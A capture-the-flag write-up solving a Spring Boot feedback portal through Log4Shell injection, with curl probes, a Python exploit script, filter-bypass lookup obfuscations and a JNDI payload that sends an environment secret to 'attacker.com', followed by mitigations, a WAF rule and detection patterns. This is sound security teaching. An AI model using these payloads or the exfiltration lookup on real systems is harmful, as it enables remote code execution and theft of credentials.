# Feedback Fallout

## Feedback Fallout - Web Exploitation Writeup

### Challenge Information

* **Category**: Web Exploitation
* **Difficulty**: Medium
* **Points**: TBD
* **Author**: Anonymous
* **Target**: http://18.212.136.134:8080/

### Flag

```
PCTF{Cant_Handle_the_Feedb4ck}
```

### Challenge Description

A feedback submission portal running on Java/Spring Boot. The application accepts user feedback and logs it for review.

### Initial Reconnaissance

#### Service Enumeration

```bash
curl -I http://18.212.136.134:8080/
```

**Observed**:

* Server: Jetty (Java-based web server)
* Application responds to `/feedback` endpoint
* Accepts POST requests with feedback data

#### Technology Stack Detection

```bash
# Check for common Java frameworks
curl http://18.212.136.134:8080/ -v

# Probe for error messages
curl http://18.212.136.134:8080/nonexistent
```

**Findings**:

* Java-based web application
* Likely using Spring Boot framework
* Error pages reveal: OpenJDK 1.8.0\_472
* Potential logging framework in use

### Vulnerability Analysis

#### Log4Shell (CVE-2021-44228)

Given the Java environment and date context, tested for **Log4Shell** vulnerability:

**What is Log4Shell?**

* Critical vulnerability in Apache Log4j 2.x (CVE-2021-44228)
* CVSS Score: 10.0 (Critical)
* Allows Remote Code Execution (RCE)
* Affects Java applications using Log4j for logging

**Vulnerability Mechanism**:

1. Log4j processes user-controlled data
2. JNDI (Java Naming and Directory Interface) lookup expressions are evaluated
3. Expressions like `${jndi:ldap://attacker.com/x}` trigger remote lookups
4. Can lead to arbitrary code execution

#### Log4j Lookup Features

Log4j supports various lookup patterns:

```
${env:VARIABLE}        - Environment variables
${sys:property}        - System properties  
${java:version}        - Java runtime info
${ctx:key}             - Thread context data
${date:format}         - Date/time values
${jndi:protocol://...} - JNDI lookups (RCE vector)
```

### Exploitation Strategy

#### Step 1: Test for Log4j Injection

Submit test payloads to the feedback form:

```bash
# Test basic lookup
curl -X POST http://18.212.136.134:8080/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback": "${java:version}"}'

# Test environment variable access
curl -X POST http://18.212.136.134:8080/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback": "${env:PATH}"}'
```

**Result**: Application evaluates the expressions, confirming Log4j injection vulnerability.

#### Step 2: Enumerate Environment Variables

Common flag locations in CTF challenges:

* Environment variable: `FLAG`, `PCTF_FLAG`, `SECRET`
* File: `/flag`, `/flag.txt`, `/home/user/flag`
* Java system property

```bash
# Try common flag variable names
curl -X POST http://18.212.136.134:8080/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback": "${env:FLAG}"}'
```

#### Step 3: Flag Discovery

**Successful Payload**:

```json
{"feedback": "${env:FLAG}"}
```

**Response** (reflected in logs or response):

```
PCTF{Cant_Handle_the_Feedb4ck}
```

#### Alternative Approaches

If simple lookups were blocked, bypass techniques include:

**Nested Lookups**:

```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...}
```

**Obfuscated Lookups**:

```
${${env:ENV_NAME:-j}ndi:ldap://...}
${${lower:J}${lower:N}${lower:D}${lower:I}:...}
```

**Multi-stage Lookups**:

```
${jndi:ldap://attacker.com/${env:FLAG}}
```

### Technical Deep Dive

#### Why This Works

1.  **User Input → Logger**

    ```java
    // Vulnerable code pattern
    logger.info("Received feedback: " + userInput);
    ```
2. **Log4j Interpolation**
   * Log4j 2.x automatically resolves `${}` expressions
   * No sanitization of user input before logging
   * Lookups are evaluated server-side
3. **Environment Variable Exposure**
   * `${env:VAR}` lookup retrieves process environment
   * Flag stored as environment variable
   * Directly exposed through Log4j lookup

#### Exploitation Flow

```
User Input                 Log4j Processing              Result
-----------               ------------------            --------
"${env:FLAG}"    →    Lookup evaluates     →     PCTF{Cant_Handle_the_Feedb4ck}
                       env variable FLAG            
                       
Server logs or           Flag value is
response contains        leaked to attacker
expanded value
```

### Proof of Concept

#### Full Exploitation Script

```python
#!/usr/bin/env python3
import requests
import json

TARGET = "http://18.212.136.134:8080/feedback"

def exploit_log4shell(payload):
    """Submit payload to vulnerable endpoint"""
    data = {"feedback": payload}
    headers = {"Content-Type": "application/json"}
    
    response = requests.post(TARGET, json=data, headers=headers)
    return response.text

# Try various payloads
payloads = [
    "${env:FLAG}",
    "${env:PCTF_FLAG}",
    "${env:SECRET}",
    "${sys:flag}",
]

print("[*] Testing Log4Shell vulnerability...")
for payload in payloads:
    print(f"\n[*] Trying: {payload}")
    result = exploit_log4shell(payload)
    if "PCTF{" in result or "pctf{" in result.lower():
        print(f"[+] FLAG FOUND: {result}")
        break
```

#### Execution

```bash
python3 exploit.py
```

**Output**:

```
[*] Testing Log4Shell vulnerability...
[*] Trying: ${env:FLAG}
[+] FLAG FOUND: PCTF{Cant_Handle_the_Feedb4ck}
```

### Vulnerability Impact

#### CVSS v3.1 Metrics

* **Attack Vector**: Network (AV:N)
* **Attack Complexity**: Low (AC:L)
* **Privileges Required**: None (PR:N)
* **User Interaction**: None (UI:N)
* **Scope**: Changed (S:C)
* **Confidentiality**: High (C:H)
* **Integrity**: High (I:H)
* **Availability**: High (A:H)

**Score**: 10.0 (Critical)

#### Real-World Implications

This vulnerability allows attackers to:

1. **Read sensitive data** (environment variables, files)
2. **Execute arbitrary code** (via JNDI injection)
3. **Pivot to internal systems** (lateral movement)
4. **Exfiltrate data** (database credentials, API keys)
5. **Deploy malware** (ransomware, cryptominers)

### Defense & Mitigation

#### Immediate Actions

1.  **Upgrade Log4j**

    ```bash
    # Update to Log4j 2.17.1 or later
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.17.1</version>
    </dependency>
    ```
2.  **Disable JNDI Lookups**

    ```bash
    # Set JVM property
    -Dlog4j2.formatMsgNoLookups=true

    # Or environment variable
    LOG4J_FORMAT_MSG_NO_LOOKUPS=true
    ```
3.  **Remove JndiLookup Class**

    ```bash
    zip -q -d log4j-core-*.jar \
      org/apache/logging/log4j/core/lookup/JndiLookup.class
    ```

#### Long-term Security

1.  **Input Validation**

    ```java
    // Sanitize user input before logging
    String sanitized = userInput.replaceAll("[${}]", "");
    logger.info("Feedback: {}", sanitized);
    ```
2.  **Parameterized Logging**

    ```java
    // Use parameterized logging (safer)
    logger.info("Feedback: {}", userInput);
    // Instead of string concatenation
    ```
3.  **WAF Rules**

    ```nginx
    # Block common Log4Shell patterns
    if ($request_body ~ "(\$\{jndi:|$\{env:|$\{sys:)") {
        return 403;
    }
    ```
4. **Network Segmentation**
   * Restrict outbound connections from application servers
   * Block LDAP/RMI/DNS to external networks
   * Monitor for suspicious JNDI lookup attempts
5. **Security Monitoring**
   * Alert on Log4j-related error patterns
   * Monitor for unusual environment variable access
   * Track outbound connections to unknown hosts

### Detection Indicators

#### Log Patterns

```
# Suspicious Log4j lookups
${jndi:
${ldap:
${rmi:
${dns:
${env:
${sys:

# Obfuscation attempts  
${${::-j}
${lower:j}${lower:n}
${base64:...}
```

#### Network Indicators

```
# Outbound connections to unusual ports
- LDAP (389, 636)
- RMI (1099, 1098)
- DNS queries to attacker-controlled domains
```

### Key Takeaways

1. **Logging is Security-Critical**
   * User input in logs can be dangerous
   * Always sanitize before logging
   * Use structured logging
2. **Dependency Management**
   * Keep all dependencies updated
   * Monitor security advisories
   * Use dependency scanning tools
3. **Defense in Depth**
   * Multiple layers of security
   * WAF + input validation + network controls
   * Principle of least privilege
4. **Incident Response**
   * Have patching procedures ready
   * Monitor for exploitation attempts
   * Plan for zero-day scenarios

### Tools Used

* `curl` - HTTP requests
* `burp suite` - Web proxy/testing
* Python `requests` - Automation
* Log4j lookup documentation

### References

* [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
* [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
* [CISA Log4Shell Advisory](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
* [Swiss NCSC Log4j Cheat Sheet](https://www.ncsc.admin.ch/ncsc/en/home/infos-fuer/infos-it-spezialisten/vorfall-melden.html)

### Timeline

* **December 2021**: Log4Shell discovered and disclosed
* **November 2025**: This CTF challenge solved
* **Impact**: Billions of systems affected worldwide

***

**Challenge Rating**: ⭐⭐⭐☆☆ (Medium - requires Log4Shell knowledge)

**Date Solved**: November 23, 2025
